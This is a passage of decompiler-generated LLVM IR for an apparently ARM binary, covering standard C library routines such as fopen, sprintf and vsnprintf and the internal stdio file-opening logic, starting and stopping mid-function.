  store i32 %v15_af44, i32* @r8, align 4
  store i32 %v27_af44, i32* @lr, align 4
  ret i32 %v0_b254

; uselistorder directives
  uselistorder i32 %v0_b224, { 1, 0, 2 }
  uselistorder i32 %v1_b208.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_b1f8, { 1, 0 }
  uselistorder i32 %v0_b1cc, { 1, 0 }
  uselistorder i32 %v0_b1b4, { 1, 0, 2 }
  uselistorder i32 %v1_b198.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v1_b180, { 1, 0 }
  uselistorder i32 %v0_b138, { 1, 0, 2 }
  uselistorder i32 %v1_b11c.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_b0ac, { 1, 0, 2 }
  uselistorder i32 %v1_b090.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_b080, { 1, 0 }
  uselistorder i32 %v0_b03c, { 1, 0, 2 }
  uselistorder i32 %v1_b020.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_b000, { 1, 0 }
  uselistorder i32 %v1_af8c.pre, { 2, 1, 0 }
  uselistorder i32* %r3.global-to-local, { 4, 5, 7, 6, 46, 8, 9, 10, 11, 12, 14, 13, 1, 15, 18, 16, 17, 19, 21, 20, 0, 22, 23, 24, 25, 26, 28, 27, 45, 29, 30, 31, 32, 34, 33, 2, 35, 36, 37, 38, 39, 40, 41, 43, 42, 3, 44 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 25, 21, 22, 0, 23, 24, 26, 1 }
  uselistorder i32* %fp.global-to-local, { 1, 0, 2 }
  uselistorder i1* %cpsr_c.global-to-local, { 1, 2, 3, 34, 35, 4, 5, 7, 6, 0, 8, 9, 10, 11, 32, 33, 12, 13, 14, 15, 16, 26, 27, 17, 18, 19, 28, 29, 20, 21, 22, 23, 30, 31, 24, 25 }
  uselistorder label %dec_label_pc_b250, { 1, 2, 0 }
  uselistorder label %dec_label_pc_b228, { 2, 1, 0 }
  uselistorder label %dec_label_pc_b210, { 1, 0 }
  uselistorder label %dec_label_pc_b1c8, { 1, 0 }
  uselistorder label %bb51, { 1, 0 }
  uselistorder label %dec_label_pc_b1b8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_b1a0, { 1, 0 }
  uselistorder label %bb49, { 1, 0 }
  uselistorder label %dec_label_pc_b164, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_b13c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_b124, { 1, 0 }
  uselistorder label %dec_label_pc_b0d8, { 1, 2, 0 }
  uselistorder label %dec_label_pc_b0b0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_b098, { 1, 0 }
  uselistorder label %dec_label_pc_b050, { 1, 0 }
  uselistorder label %bb47, { 1, 0 }
  uselistorder label %dec_label_pc_b040, { 2, 1, 0 }
  uselistorder label %dec_label_pc_b028, { 1, 0 }
  uselistorder label %bb45, { 1, 0 }
  uselistorder label %bb43, { 1, 0 }
  uselistorder label %dec_label_pc_afc8, { 1, 0 }
  uselistorder label %dec_label_pc_afbc, { 1, 0 }
  uselistorder label %bb41, { 1, 0 }
  uselistorder label %dec_label_pc_afac, { 2, 1, 0 }
  uselistorder label %dec_label_pc_af94, { 1, 0 }
}

define i32 @function_b268(i32 %arg1) local_unnamed_addr {
dec_label_pc_b268:
  %v0_b268 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_b268, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_b268
  %v2_b268 = load i32, i32* @r8, align 4
  %v5_b268 = udiv i32 %v2_b268, 2
  %v6_b268 = and i32 %v5_b268, %arg1
  %v2_b26c = load i32, i32* @ip, align 4
  %v3_b26c = and i32 %v6_b268, %v2_b26c
  %v8_b270 = ashr i32 %v2_b268, %v3_b26c
  %v9_b270 = and i32 %v8_b270, %v3_b26c
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_b268, %bb
  %v10_b270 = phi i32 [ %arg1, %dec_label_pc_b268 ], [ %v9_b270, %bb ]
  ret i32 %v10_b270

; uselistorder directives
  uselistorder i32 %v2_b268, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @__GI_fopen(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 0, i32* @r2, align 4
  store i32 -1, i32* @r3, align 4
  %v0_b284 = call i32 @_stdio_fopen()
  ret i32 %v0_b284
}

define i32 @vsprintf(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r3, align 4
  store i32 %arg1, i32* @r2, align 4
  store i32 -1, i32* @r1, align 4
  %v0_b2a8 = call i32 @__GI_vsnprintf()
  ret i32 %v0_b2a8
}

define i32 @sprintf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  store i32 %arg2, i32* %stack_var_-8, align 4
  %v2_b2c4 = ptrtoint i32* %stack_var_-8 to i32
  store i32 %v2_b2c4, i32* @r3, align 4
  store i32 -1, i32* @r1, align 4
  store i32 %arg1, i32* @r2, align 4
  %v0_b2d8 = call i32 @__GI_vsnprintf()
  ret i32 %v0_b2d8

; uselistorder directives
  uselistorder i32* %stack_var_-8, { 1, 0 }
  uselistorder i32 ()* @__GI_vsnprintf, { 1, 0 }
}

define i32 @__GI_vsnprintf() local_unnamed_addr {
entry:
  %stack_var_-96 = alloca i32, align 4
  %v3_b2ec = load i32, i32* @r4, align 4
  %v6_b2ec = load i32, i32* @r5, align 4
  %v9_b2ec = load i32, i32* @r6, align 4
  %v2_b300 = ptrtoint i32* %stack_var_-96 to i32
  %v0_b304 = load i32, i32* @r0, align 4
  store i32 %v0_b304, i32* @r4, align 4
  %v0_b308 = load i32, i32* @r2, align 4
  %v0_b30c = load i32, i32* @r1, align 4
  store i32 %v0_b30c, i32* @r5, align 4
  %v1_b324 = sub i32 -1, %v0_b304
  store i32 %v1_b324, i32* @lr, align 4
  %v0_b328 = load i32, i32* @r3, align 4
  store i32 %v0_b328, i32* @r2, align 4
  %v3_b330 = icmp ult i32 %v0_b30c, %v1_b324
  br i1 %v3_b330, label %bb26, label %bb

bb:                                               ; preds = %entry
  store i32 %v1_b324, i32* @r5, align 4
  br label %bb26

bb26:                                             ; preds = %entry, %bb
  %v1_b340 = phi i32 [ %v0_b30c, %entry ], [ %v1_b324, %bb ]
  %v2_b340 = add i32 %v1_b340, %v0_b304
  store i32 %v2_b340, i32* @ip, align 4
  store i32 0, i32* @r6, align 4
  store i32 208, i32* %stack_var_-96, align 4
  %v2_b380 = inttoptr i32 %v0_b308 to i8*
  %v3_b380 = call i32 @_vfprintf_internal(i32 %v2_b300, i8* %v2_b380)
  %v0_b384 = load i32, i32* @r5, align 4
  %v1_b384 = load i32, i32* @r6, align 4
  %v9_b384 = icmp eq i32 %v0_b384, %v1_b384
  br i1 %v9_b384, label %dec_label_pc_b3a8, label %dec_label_pc_b38c

dec_label_pc_b38c:                                ; preds = %bb26
  %v9_b394 = icmp eq i32 %v1_b340, 0
  br i1 %v9_b394, label %bb27, label %bb28

bb27:                                             ; preds = %dec_label_pc_b38c
  %v2_b398 = add i32 %v0_b304, -1
  br label %bb28

bb28:                                             ; preds = %dec_label_pc_b38c, %bb27
  %v1_b39c = phi i32 [ %v2_b340, %dec_label_pc_b38c ], [ %v2_b398, %bb27 ]
  %v1_b39c.v0_b378 = select i1 %v9_b394, i32 %v1_b39c, i32 %v0_b304
  %stack_var_-80.0 = inttoptr i32 %v1_b39c.v0_b378 to i8*
  %v1_b3a4 = trunc i32 %v1_b384 to i8
  store i8 %v1_b3a4, i8* %stack_var_-80.0, align 1
  br label %dec_label_pc_b3a8

dec_label_pc_b3a8:                                ; preds = %bb26, %bb28
  store i32 %v3_b2ec, i32* @r4, align 4
  store i32 %v6_b2ec, i32* @r5, align 4
  store i32 %v9_b2ec, i32* @r6, align 4
  ret i32 %v3_b380

; uselistorder directives
  uselistorder i1 %v9_b394, { 1, 0 }
  uselistorder i32 %v1_b340, { 1, 0 }
  uselistorder i32 %v1_b324, { 3, 2, 1, 0 }
  uselistorder i32 %v0_b304, { 3, 2, 1, 0, 4 }
  uselistorder label %dec_label_pc_b3a8, { 1, 0 }
  uselistorder label %bb28, { 1, 0 }
  uselistorder label %bb26, { 1, 0 }
}

define i32 @_stdio_fopen() local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_b3bc = load i32, i32* @r4, align 4
  store i32 %v3_b3bc, i32* %stack_var_-24, align 4
  %v6_b3bc = load i32, i32* @r5, align 4
  %v9_b3bc = load i32, i32* @r6, align 4
  %v12_b3bc = load i32, i32* @r7, align 4
  %v15_b3bc = load i32, i32* @r8, align 4
  %v0_b3c0 = load i32, i32* @r1, align 4
  %v1_b3c0 = inttoptr i32 %v0_b3c0 to i8*
  %v2_b3c0 = load i8, i8* %v1_b3c0, align 1
  %v3_b3c0 = zext i8 %v2_b3c0 to i32
  store i32 %v3_b3c0, i32* @ip, align 4
  %v2_b3c8 = icmp ugt i8 %v2_b3c0, 113
  store i1 %v2_b3c8, i1* %cpsr_c.global-to-local, align 1
  %v7_b3c8 = icmp eq i8 %v2_b3c0, 114
  store i32 ptrtoint (i32* @global_var_24010.405 to i32), i32* @r8, align 4
  %v0_b3d4 = load i32, i32* @r0, align 4
  store i32 %v0_b3d4, i32* @r7, align 4
  %v0_b3d8 = load i32, i32* @r2, align 4
  store i32 %v0_b3d8, i32* @r5, align 4
  %v0_b3dc = load i32, i32* @r3, align 4
  store i32 %v0_b3dc, i32* @r6, align 4
  br i1 %v7_b3c8, label %dec_label_pc_b430, label %dec_label_pc_b3e4

dec_label_pc_b3e4:                                ; preds = %entry
  %v2_b3e4 = icmp ugt i8 %v2_b3c0, 118
  store i1 %v2_b3e4, i1* %cpsr_c.global-to-local, align 1
  %v7_b3e4 = icmp eq i8 %v2_b3c0, 119
  br i1 %v7_b3e4, label %bb, label %dec_label_pc_b3f0

bb:                                               ; preds = %dec_label_pc_b3e4
  store i32 577, i32* @r4, align 4
  br label %dec_label_pc_b434

dec_label_pc_b3f0:                                ; preds = %dec_label_pc_b3e4
  %v2_b3f0 = icmp ugt i8 %v2_b3c0, 96
  store i1 %v2_b3f0, i1* %cpsr_c.global-to-local, align 1
  %v7_b3f0 = icmp eq i8 %v2_b3c0, 97
  br i1 %v7_b3f0, label %bb49, label %dec_label_pc_b3fc

bb49:                                             ; preds = %dec_label_pc_b3f0
  store i32 1089, i32* @r4, align 4
  br label %dec_label_pc_b434

dec_label_pc_b3fc:                                ; preds = %dec_label_pc_b3f0, %dec_label_pc_b4cc, %dec_label_pc_b4a0
  store i32 101476, i32* %r2.global-to-local, align 4
  %v0_b400 = call i32 @__aeabi_read_tp()
  store i32 %v0_b400, i32* %r0.global-to-local, align 4
  %v3_b404 = load i16, i16* @global_var_24070.401, align 2
  %v4_b404 = sext i16 %v3_b404 to i32
  store i32 %v4_b404, i32* %r2.global-to-local, align 4
  store i32 22, i32* %r3.global-to-local, align 4
  %v0_b40c = load i32, i32* @r5, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_b40c = icmp eq i32 %v0_b40c, 0
  %v3_b410 = add i32 %v4_b404, %v0_b400
  %v4_b410 = inttoptr i32 %v3_b410 to i32*
  store i32 22, i32* %v4_b410, align 4
  br i1 %v2_b40c, label %dec_label_pc_b7d4, label %dec_label_pc_b418

dec_label_pc_b418:                                ; preds = %dec_label_pc_b4f0._crit_edge, %dec_label_pc_b3fc
  %v0_b418 = load i32, i32* @r5, align 4
  %v1_b418 = inttoptr i32 %v0_b418 to i16*
  %v2_b418 = load i16, i16* %v1_b418, align 2
  %v3_b418 = zext i16 %v2_b418 to i32
  store i32 %v3_b418, i32* %r3.global-to-local, align 4
  %v1_b41c = and i32 %v3_b418, 8192
  %v2_b41c = icmp eq i32 %v1_b41c, 0
  br i1 %v2_b41c, label %dec_label_pc_b7d4, label %dec_label_pc_b424

dec_label_pc_b424:                                ; preds = %dec_label_pc_b418
  store i32 %v0_b418, i32* @r0, align 4
  %v0_b428 = call i32 @free()
  store i32 %v0_b428, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_b7d4

dec_label_pc_b430:                                ; preds = %entry
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_b434

dec_label_pc_b434:                                ; preds = %bb, %bb49, %dec_label_pc_b430
  %v1_b44c = phi i32 [ 1089, %bb49 ], [ 577, %bb ], [ 1, %dec_label_pc_b430 ]
  %v1_b434 = add i32 %v0_b3c0, 1
  %v2_b434 = inttoptr i32 %v1_b434 to i8*
  %v3_b434 = load i8, i8* %v2_b434, align 1
  %v2_b438 = icmp ugt i8 %v3_b434, 97
  store i1 %v2_b438, i1* %cpsr_c.global-to-local, align 1
  %v7_b438 = icmp eq i8 %v3_b434, 98
  %v1_b434.v0_b3c0 = select i1 %v7_b438, i32 %v1_b434, i32 %v0_b3c0
  store i32 %v1_b434.v0_b3c0, i32* %r3.global-to-local, align 4
  %v1_b444 = add i32 %v1_b434.v0_b3c0, 1
  %v2_b444 = inttoptr i32 %v1_b444 to i8*
  %v3_b444 = load i8, i8* %v2_b444, align 1
  %v4_b444 = zext i8 %v3_b444 to i32
  store i32 %v4_b444, i32* @r3, align 4
  %v2_b448 = icmp ugt i8 %v3_b444, 42
  store i1 %v2_b448, i1* %cpsr_c.global-to-local, align 1
  %v7_b448 = icmp eq i8 %v3_b444, 43
  br i1 %v7_b448, label %bb52, label %.thread3

bb52:                                             ; preds = %dec_label_pc_b434
  store i32 %v1_b44c, i32* @r3, align 4
  %v2_b450 = add nuw nsw i32 %v1_b44c, 1
  store i32 %v2_b450, i32* @r4, align 4
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_b434, %bb52
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_b454 = icmp eq i32 %v0_b3d8, 0
  br i1 %v2_b454, label %dec_label_pc_b45c, label %dec_label_pc_b498

dec_label_pc_b45c:                                ; preds = %.thread3
  store i32 68, i32* %r0.global-to-local, align 4
  %v1_b460 = call i32 @malloc(i32 68)
  store i32 %v1_b460, i32* %r0.global-to-local, align 4
  store i32 %v1_b460, i32* @r5, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v3_b464 = icmp eq i32 %v1_b460, 0
  br i1 %v3_b464, label %dec_label_pc_b7d8, label %dec_label_pc_b46c

dec_label_pc_b46c:                                ; preds = %dec_label_pc_b45c
  %v0_b470 = load i32, i32* @r8, align 4
  %v2_b470 = add i32 %v0_b470, -38996
  store i32 %v2_b470, i32* %r3.global-to-local, align 4
  %v1_b474 = inttoptr i32 %v2_b470 to i32*
  %v2_b474 = load i32, i32* %v1_b474, align 4
  store i32 %v2_b474, i32* %r0.global-to-local, align 4
  %v3_b474 = add i32 %v0_b470, -38992
  %v4_b474 = inttoptr i32 %v3_b474 to i32*
  %v5_b474 = load i32, i32* %v4_b474, align 4
  store i32 %v5_b474, i32* @r1, align 4
  %v6_b474 = add i32 %v0_b470, -38988
  %v7_b474 = inttoptr i32 %v6_b474 to i32*
  %v8_b474 = load i32, i32* %v7_b474, align 4
  store i32 %v8_b474, i32* %r2.global-to-local, align 4
  %v2_b480 = add i32 %v1_b460, 8
  %v3_b480 = inttoptr i32 %v2_b480 to i32*
  store i32 0, i32* %v3_b480, align 4
  store i32 8192, i32* @ip, align 4
  %v2_b488 = load i32, i32* @r5, align 4
  %v3_b488 = inttoptr i32 %v2_b488 to i16*
  store i16 8192, i16* %v3_b488, align 2
  %v2_b48c = load i32, i32* %r0.global-to-local, align 4
  %v0_b490 = load i32, i32* @r5, align 4
  %v1_b490 = add i32 %v0_b490, 56
  store i32 %v1_b490, i32* @r3, align 4
  %v1_b494 = inttoptr i32 %v1_b490 to i32*
  store i32 %v2_b48c, i32* %v1_b494, align 4
  %v3_b494 = add i32 %v0_b490, 60
  %v4_b494 = inttoptr i32 %v3_b494 to i32*
  %v5_b494 = load i32, i32* @r1, align 4
  store i32 %v5_b494, i32* %v4_b494, align 4
  %v6_b494 = add i32 %v0_b490, 64
  %v7_b494 = inttoptr i32 %v6_b494 to i32*
  %v8_b494 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_b494, i32* %v7_b494, align 4
  %v0_b498.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_b498

dec_label_pc_b498:                                ; preds = %.thread3, %dec_label_pc_b46c
  %v0_b4f0 = phi i32 [ %v0_b3dc, %.thread3 ], [ %v0_b498.pre, %dec_label_pc_b46c ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_b498 = icmp slt i32 %v0_b4f0, 0
  br i1 %v1_b498, label %dec_label_pc_b4f0, label %dec_label_pc_b4a0

dec_label_pc_b4a0:                                ; preds = %dec_label_pc_b498
  %v0_b4a4 = load i32, i32* @r4, align 4
  %v2_b4a4 = and i32 %v0_b4a4, 131075
  %v1_b4a8 = add nuw nsw i32 %v2_b4a4, 1
  store i32 %v1_b4a8, i32* %r2.global-to-local, align 4
  %v0_b4ac = load i32, i32* @r7, align 4
  %v1_b4ac = add i32 %v0_b4ac, 1
  %v2_b4b0 = and i32 %v1_b4ac, %v1_b4a8
  store i32 %v2_b4b0, i32* %r3.global-to-local, align 4
  %v3_b4b4 = icmp uge i32 %v2_b4b0, %v1_b4a8
  store i1 %v3_b4b4, i1* %cpsr_c.global-to-local, align 1
  %v9_b4b4 = icmp eq i32 %v2_b4b0, %v1_b4a8
  %v1_b4b8 = load i32, i32* @r5, align 4
  %v2_b4b8 = add i32 %v1_b4b8, 4
  %v3_b4b8 = inttoptr i32 %v2_b4b8 to i32*
  store i32 %v0_b4f0, i32* %v3_b4b8, align 4
  br i1 %v9_b4b4, label %dec_label_pc_b4c0, label %dec_label_pc_b3fc

dec_label_pc_b4c0:                                ; preds = %dec_label_pc_b4a0
  %v0_b4c0 = load i32, i32* @r4, align 4
  %v1_b4c0 = load i32, i32* @r7, align 4
  %v2_b4c0 = sub i32 -1, %v1_b4c0
  %v3_b4c0 = and i32 %v0_b4c0, %v2_b4c0
  store i32 %v3_b4c0, i32* @r3, align 4
  %v1_b4c4 = and i32 %v3_b4c0, 1024
  %v2_b4c4 = icmp eq i32 %v1_b4c4, 0
  br i1 %v2_b4c4, label %dec_label_pc_b4e4, label %dec_label_pc_b4cc

dec_label_pc_b4cc:                                ; preds = %dec_label_pc_b4c0
  %v0_b4cc = load i32, i32* @r6, align 4
  store i32 %v0_b4cc, i32* %r0.global-to-local, align 4
  store i32 1024, i32* @r2, align 4
  %v2_b4d8 = call i32 @__libc_fcntl(i32 %v0_b4cc, i32 4)
  store i32 %v2_b4d8, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_b4dc = icmp eq i32 %v2_b4d8, 0
  br i1 %v2_b4dc, label %dec_label_pc_b4cc.dec_label_pc_b4e4_crit_edge, label %dec_label_pc_b3fc

dec_label_pc_b4cc.dec_label_pc_b4e4_crit_edge:    ; preds = %dec_label_pc_b4cc
  %v0_b4e4.pre = load i32, i32* @r7, align 4
  %v0_b4e8.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_b4e4

dec_label_pc_b4e4:                                ; preds = %dec_label_pc_b4cc.dec_label_pc_b4e4_crit_edge, %dec_label_pc_b4c0
  %v0_b4e8 = phi i32 [ %v0_b4e8.pre, %dec_label_pc_b4cc.dec_label_pc_b4e4_crit_edge ], [ %v0_b4c0, %dec_label_pc_b4c0 ]
  %v0_b4e4 = phi i32 [ %v0_b4e4.pre, %dec_label_pc_b4cc.dec_label_pc_b4e4_crit_edge ], [ %v1_b4c0, %dec_label_pc_b4c0 ]
  %v1_b4e4 = and i32 %v0_b4e4, 131072
  store i32 %v1_b4e4, i32* %r3.global-to-local, align 4
  %v2_b4e8 = or i32 %v1_b4e4, %v0_b4e8
  store i32 %v2_b4e8, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_b514

dec_label_pc_b4f0:                                ; preds = %dec_label_pc_b498
  %v2_b4f0 = icmp eq i32 %v0_b4f0, -1
  store i1 %v2_b4f0, i1* %cpsr_c.global-to-local, align 1
  %v7_b4f0 = icmp eq i32 %v0_b4f0, -1
  %v0_b4fc.pre = load i32, i32* @r4, align 4
  br i1 %v7_b4f0, label %dec_label_pc_b4f0._crit_edge, label %bb53

bb53:                                             ; preds = %dec_label_pc_b4f0
  %v2_b4f4 = or i32 %v0_b4fc.pre, 131072
  store i32 %v2_b4f4, i32* @r4, align 4
  br label %dec_label_pc_b4f0._crit_edge

dec_label_pc_b4f0._crit_edge:                     ; preds = %dec_label_pc_b4f0, %bb53
  %v0_b4fc = phi i32 [ %v2_b4f4, %bb53 ], [ %v0_b4fc.pre, %dec_label_pc_b4f0 ]
  %v0_b4f8 = load i32, i32* @r7, align 4
  store i32 %v0_b4f8, i32* %r0.global-to-local, align 4
  store i32 438, i32* @r2, align 4
  %v2_b504 = call i32 @__libc_open(i32 %v0_b4f8, i32 %v0_b4fc)
  store i32 %v2_b504, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_b508 = icmp slt i32 %v2_b504, 0
  %v1_b50c = load i32, i32* @r5, align 4
  %v2_b50c = add i32 %v1_b50c, 4
  %v3_b50c = inttoptr i32 %v2_b50c to i32*
  store i32 %v2_b504, i32* %v3_b50c, align 4
  br i1 %v1_b508, label %dec_label_pc_b418, label %.dec_label_pc_b514_crit_edge

.dec_label_pc_b514_crit_edge:                     ; preds = %dec_label_pc_b4f0._crit_edge
  %v0_b518.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_b514

dec_label_pc_b514:                                ; preds = %.dec_label_pc_b514_crit_edge, %dec_label_pc_b4e4
  %v0_b530 = phi i32 [ %v0_b518.pre, %.dec_label_pc_b514_crit_edge ], [ %v2_b4e8, %dec_label_pc_b4e4 ]
  %v0_b514 = load i32, i32* @r5, align 4
  %v1_b514 = inttoptr i32 %v0_b514 to i16*
  %v2_b514 = load i16, i16* %v1_b514, align 2
  %v3_b514 = zext i16 %v2_b514 to i32
  %v1_b518 = urem i32 %v0_b530, 4
  %v1_b51c = and i32 %v0_b530, 1024
  %v1_b520 = and i32 %v3_b514, 8192
  %v1_b524 = add nuw nsw i32 %v1_b518, 1
  %v2_b528 = or i32 %v1_b520, %v1_b51c
  store i32 %v2_b528, i32* %r3.global-to-local, align 4
  %v1_b52c = xor i32 %v1_b524, 3
  %v1_b530 = and i32 %v0_b530, 131072
  store i32 %v1_b530, i32* %r2.global-to-local, align 4
  %v2_b530 = icmp eq i32 %v1_b530, 0
  %v1_b534 = add i32 %v0_b514, 4
  %v2_b534 = inttoptr i32 %v1_b534 to i32*
  %v3_b534 = load i32, i32* %v2_b534, align 4
  store i32 %v3_b534, i32* @r4, align 4
  br i1 %v2_b530, label %bb55, label %bb54

bb54:                                             ; preds = %dec_label_pc_b514
  store i32 32768, i32* %r2.global-to-local, align 4
  br label %bb55

bb55:                                             ; preds = %dec_label_pc_b514, %bb54
  %v0_b540 = phi i32 [ 0, %dec_label_pc_b514 ], [ 32768, %bb54 ]
  %v4_b53c = mul nuw nsw i32 %v1_b52c, 16
  %v5_b53c = or i32 %v2_b528, %v4_b53c
  store i32 %v5_b53c, i32* %r3.global-to-local, align 4
  %v2_b540 = or i32 %v0_b540, %v5_b53c
  store i32 %v2_b540, i32* %r2.global-to-local, align 4
  %v2_b544 = icmp ugt i32 %v3_b534, 2147483646
  store i1 %v2_b544, i1* %cpsr_c.global-to-local, align 1
  %v8_b544 = icmp eq i32 %v3_b534, 2147483647
  %v1_b548 = trunc i32 %v2_b540 to i16
  store i16 %v1_b548, i16* %v1_b514, align 2
  br i1 %v8_b544, label %dec_label_pc_b588, label %dec_label_pc_b550

dec_label_pc_b550:                                ; preds = %bb55
  store i32 101136, i32* %r3.global-to-local, align 4
  %v0_b554 = call i32 @__aeabi_read_tp()
  %v3_b558 = load i16, i16* @global_var_24070.401, align 2
  %v4_b558 = sext i16 %v3_b558 to i32
  store i32 %v4_b558, i32* @r3, align 4
  store i32 %v0_b554, i32* @r6, align 4
  %v0_b560 = load i32, i32* @r4, align 4
  store i32 %v0_b560, i32* @r0, align 4
  %v2_b564 = add i32 %v4_b558, %v0_b554
  %v3_b564 = inttoptr i32 %v2_b564 to i32*
  %v4_b564 = load i32, i32* %v3_b564, align 4
  store i32 %v4_b564, i32* @r4, align 4
  %v1_b568 = call i32 @isatty(i32 %v0_b560)
  store i32 %v1_b568, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_b56c = icmp eq i32 %v1_b568, 0
  br i1 %v2_b56c, label %.thread5, label %bb56

bb56:                                             ; preds = %dec_label_pc_b550
  %v1_b570 = load i32, i32* @r5, align 4
  %v2_b570 = inttoptr i32 %v1_b570 to i16*
  %v3_b570 = load i16, i16* %v2_b570, align 2
  %v4_b570 = zext i16 %v3_b570 to i32
  %v2_b574 = or i32 %v4_b570, 256
  store i32 %v2_b574, i32* %r3.global-to-local, align 4
  %v2_b578 = trunc i32 %v2_b574 to i16
  store i16 %v2_b578, i16* %v2_b570, align 2
  br label %.thread5

.thread5:                                         ; preds = %dec_label_pc_b550, %bb56
  %v3_b580 = load i16, i16* @global_var_24070.401, align 2
  %v4_b580 = sext i16 %v3_b580 to i32
  store i32 %v4_b580, i32* %r3.global-to-local, align 4
  %v0_b584 = load i32, i32* @r4, align 4
  %v1_b584 = load i32, i32* @r6, align 4
  %v3_b584 = add i32 %v1_b584, %v4_b580
  %v4_b584 = inttoptr i32 %v3_b584 to i32*
  store i32 %v0_b584, i32* %v4_b584, align 4
  br label %dec_label_pc_b588

dec_label_pc_b588:                                ; preds = %bb55, %.thread5
  %v0_b588 = load i32, i32* @r5, align 4
  %v1_b588 = add i32 %v0_b588, 8
  %v2_b588 = inttoptr i32 %v1_b588 to i32*
  %v3_b588 = load i32, i32* %v2_b588, align 4
  store i32 %v3_b588, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_b58c = icmp eq i32 %v3_b588, 0
  br i1 %v2_b58c, label %dec_label_pc_b594, label %bb57

dec_label_pc_b594:                                ; preds = %dec_label_pc_b588
  store i32 4096, i32* %r0.global-to-local, align 4
  %v1_b598 = call i32 @malloc(i32 4096)
  store i32 %v1_b598, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_b59c = icmp eq i32 %v1_b598, 0
  %v1_b5ac.pre = load i32, i32* @r5, align 4
  br i1 %v2_b59c, label %.thread9, label %.thread8

.thread8:                                         ; preds = %dec_label_pc_b594
  %v2_b5a0 = inttoptr i32 %v1_b5ac.pre to i16*
  %v3_b5a0 = load i16, i16* %v2_b5a0, align 2
  %v4_b5a0 = zext i16 %v3_b5a0 to i32
  %v2_b5a4 = add i32 %v1_b598, 4096
  store i32 %v2_b5a4, i32* %r2.global-to-local, align 4
  %v2_b5a8 = or i32 %v4_b5a0, 16384
  store i32 %v2_b5a8, i32* %r3.global-to-local, align 4
  %v2_b5ac = add i32 %v1_b5ac.pre, 8
  %v3_b5ac = inttoptr i32 %v2_b5ac to i32*
  store i32 %v1_b598, i32* %v3_b5ac, align 4
  %v1_b5b0 = load i32, i32* %r2.global-to-local, align 4
  %v2_b5b0 = load i32, i32* @r5, align 4
  %v3_b5b0 = add i32 %v2_b5b0, 12
  %v4_b5b0 = inttoptr i32 %v3_b5b0 to i32*
  store i32 %v1_b5b0, i32* %v4_b5b0, align 4
  %v1_b5b4 = load i32, i32* %r3.global-to-local, align 4
  %v2_b5b4 = trunc i32 %v1_b5b4 to i16
  %v3_b5b4 = load i32, i32* @r5, align 4
  %v4_b5b4 = inttoptr i32 %v3_b5b4 to i16*
  store i16 %v2_b5b4, i16* %v4_b5b4, align 2
  br label %bb57

.thread9:                                         ; preds = %dec_label_pc_b594
  %v2_b5ac37 = add i32 %v1_b5ac.pre, 8
  %v3_b5ac38 = inttoptr i32 %v2_b5ac37 to i32*
  store i32 0, i32* %v3_b5ac38, align 4
  %v2_b5b8 = load i32, i32* @r5, align 4
  %v3_b5b8 = add i32 %v2_b5b8, 12
  %v4_b5b8 = inttoptr i32 %v3_b5b8 to i32*
  store i32 0, i32* %v4_b5b8, align 4
  br label %bb57

bb57:                                             ; preds = %.thread8, %dec_label_pc_b588, %.thread9
  store i32 100, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v0_b5c4 = load i32, i32* @r8, align 4
  %v2_b5c4 = add i32 %v0_b5c4, 100
  %v3_b5c4 = inttoptr i32 %v2_b5c4 to i32*
  %v4_b5c4 = load i32, i32* %v3_b5c4, align 4
  store i32 %v4_b5c4, i32* %r3.global-to-local, align 4
  %v2_b5c8 = load i32, i32* @r5, align 4
  %v3_b5c8 = add i32 %v2_b5c8, 2
  %v4_b5c8 = inttoptr i32 %v3_b5c8 to i8*
  store i8 0, i8* %v4_b5c8, align 1
  %v0_b5cc = load i32, i32* @r5, align 4
  %v1_b5cc = inttoptr i32 %v0_b5cc to i16*
  %v2_b5cc = load i16, i16* %v1_b5cc, align 2
  %v3_b5cc = zext i16 %v2_b5cc to i32
